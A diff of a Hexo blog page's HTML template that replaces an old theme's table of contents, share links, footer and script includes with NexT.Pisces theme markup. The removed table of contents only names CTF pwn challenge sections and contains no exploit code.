-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn1"><span class="toc-number">1.</span> <span class="toc-text">pwn1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析程序"><span class="toc-number">1.1.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.2.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#相关链接"><span class="toc-number">1.3.</span> <span class="toc-text">相关链接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn-100"><span class="toc-number">2.</span> <span class="toc-text">pwn-100</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DynELF"><span class="toc-number">2.1.</span> <span class="toc-text">DynELF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用条件"><span class="toc-number">2.2.</span> <span class="toc-text">使用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.3.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#相关链接-1"><span class="toc-number">2.4.</span> <span class="toc-text">相关链接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mary-Morton"><span class="toc-number">3.</span> <span class="toc-text">Mary_Morton</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析程序-1"><span class="toc-number">3.1.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#确定偏移"><span class="toc-number">3.2.</span> <span class="toc-text">确定偏移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击"><span class="toc-number">3.3.</span> <span class="toc-text">攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stack2"><span class="toc-number">4.</span> <span class="toc-text">stack2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#welpwn"><span class="toc-number">5.</span> <span class="toc-text">welpwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-number">5.1.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Time-formatter"><span class="toc-number">6.</span> <span class="toc-text">Time formatter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#note-service2"><span class="toc-number">7.</span> <span class="toc-text">note-service2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode"><span class="toc-number">7.1.</span> <span class="toc-text">shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-2"><span class="toc-number">7.2.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://suvii22.github.io/2019/10/08/攻防世界/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://suvii22.github.io/2019/10/08/攻防世界/&text=攻防世界"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://suvii22.github.io/2019/10/08/攻防世界/&title=攻防世界"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://suvii22.github.io/2019/10/08/攻防世界/&is_video=false&description=攻防世界"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=攻防世界&body=Check out this article: http://suvii22.github.io/2019/10/08/攻防世界/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://suvii22.github.io/2019/10/08/攻防世界/&title=攻防世界"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://suvii22.github.io/2019/10/08/攻防世界/&title=攻防世界"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://suvii22.github.io/2019/10/08/攻防世界/&title=攻防世界"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://suvii22.github.io/2019/10/08/攻防世界/&title=攻防世界"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://suvii22.github.io/2019/10/08/攻防世界/&name=攻防世界&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://suvii22.github.io/2019/10/08/攻防世界/&t=攻防世界"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
+  
 </div>
 
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
         
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
-    
-    
-    2018-2020
-    Apr1L
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-          <li><a href="/">Home</a></li>
-         
-          <li><a href="/about/">About</a></li>
-         
-          <li><a href="/archives/">Writing</a></li>
-         
-          <li><a href="/tags/">tags</a></li>
-         
-          <li><a href="/categories/">categories</a></li>
+
+
+
+
+
+
+
         
-      </ul>
-    </nav>
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
   </div>
-</footer>
 
-    </div>
-    <!-- styles -->
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+  
 
-    <!-- jquery -->
-<script src="/lib/jquery/jquery.min.js"></script>
-<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
-<!-- clipboard -->
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
 
-  <script src="/lib/clipboard/clipboard.min.js"></script>
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
-    btn += '<i class="far fa-clone"></i>';
-    btn += '</span>'; 
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "Copied!");
-      e.clearSelection();
-    })
-  })
-  </script>
 
-<script src="/js/main.js"></script>
-<!-- search -->
 
-<!-- Google Analytics -->
 
-<!-- Baidu Analytics -->
 
-<!-- Disqus Comments -->
 
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
 
 </body>
 </html>
